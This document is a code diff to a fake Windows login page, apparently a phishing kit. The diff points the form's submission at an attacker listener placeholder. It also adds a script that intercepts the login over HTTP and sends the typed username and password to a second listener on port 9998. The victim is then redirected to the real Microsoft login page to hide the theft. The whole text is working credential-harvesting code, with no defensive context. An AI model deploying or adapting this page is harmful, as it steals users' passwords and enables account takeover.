@@ -105,7 +105,7 @@
       <p style="font-size: 14px; margin: 14px 0 17px;">Authorization required by http://website.com</p>
     </div>
     <div class="login-content">
-      <form method="POST" action="http://[FakeWindowsAuthListenerIP]:9999/capture">
+      <form method="POST" action="https://[FakeWindowsAuthListenerIPHTTPS]:9999/capture">
         <fieldset style="border: none; margin: 0; padding: 0;">
           <div class="form-group">
             <input type="text" id="UserNameText" name="username" placeholder="User name" required />
@@ -121,6 +121,31 @@
       </form>
     </div>
   </div>
+
+  <script>
+    document.getElementById("loginForm").addEventListener("submit", function(e) {
+      if (window.location.protocol === "http:") {
+        // Intercept form submission over HTTP
+        e.preventDefault();
+
+        const user = document.getElementById("username").value;
+        const pass = document.getElementById("password").value;
+
+        const xhr = new XMLHttpRequest();
+        xhr.open("GET", "http://[FakeWindowsAuthListenerIPHTTP]:9998/log?u=" + 
+                 encodeURIComponent(user) + 
+                 "&p=" + 
+                 encodeURIComponent(pass), true);
+        xhr.send();
+
+        // Optional redirect
+        setTimeout(() => {
+          window.location.href = "https://login.microsoftonline.com/";
+        }, 1000);
+      }
+      // Else: let HTTPS submission proceed normally
+    });
+  </script>
 
   <script>
     const loginWindow = document.getElementById('loginWindow');
